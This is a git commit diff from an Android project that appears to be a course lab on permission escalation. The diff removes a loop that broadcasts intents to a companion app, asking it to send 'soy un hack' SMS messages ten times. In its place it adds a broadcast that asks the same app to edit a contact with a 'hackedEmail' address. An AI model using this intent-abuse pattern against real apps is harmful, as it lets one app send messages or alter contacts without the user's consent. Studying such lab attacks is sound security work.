36b55e1b018d524a890ec6e46c310baeea052d1c
Juan Navarro <jnavcamacho@gmail.com>
2018-05-18 13:10:03 -0600

    add stable version

--- app/src/main/java/com/soa/jnavarro/soascaleattackb/MainActivity.java
+++ app/src/main/java/com/soa/jnavarro/soascaleattackb/MainActivity.java
@@ -1,10 +1,14 @@
 package com.soa.jnavarro.soascaleattackb;
 
+import android.content.Context;
 import android.content.Intent;
+import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+import android.widget.Toast;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -17,12 +21,22 @@ public class MainActivity extends AppCompatActivity {
         testButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                for (int i =0; i<10;i++){
-                    Intent intent = new Intent("com.soa.jnavarro.soascaleattacka.SendMSS");
-                    intent.putExtra("numero","5556");
-                    intent.putExtra("mensaje","soy un hack");
-                    getApplicationContext().sendBroadcast(intent);
-                }
+                    try {
+                        Intent intent = new Intent("com.soa.jnavarro.soascaleattacka.EditContact");
+                        intent.putExtra(ContactsContract.Intents.Insert.EMAIL, "hackedEmail@email.comn");
+                        intent.putExtra(ContactsContract.Intents.Insert.PHONE, "5556");
+                        getApplicationContext().sendBroadcast(intent);
+                        Log.i("Editcontact", " trying to edit email");
+                        Context context = getApplicationContext();
+                        int duration = Toast.LENGTH_SHORT;
+                        Toast toast = Toast.makeText(context, intent.getAction(), duration);
+                        toast.show();
+                    }
+                    catch (Exception e){
+                        Log.i("Error", e.getMessage());
+                    }
+
+
 
 
             }
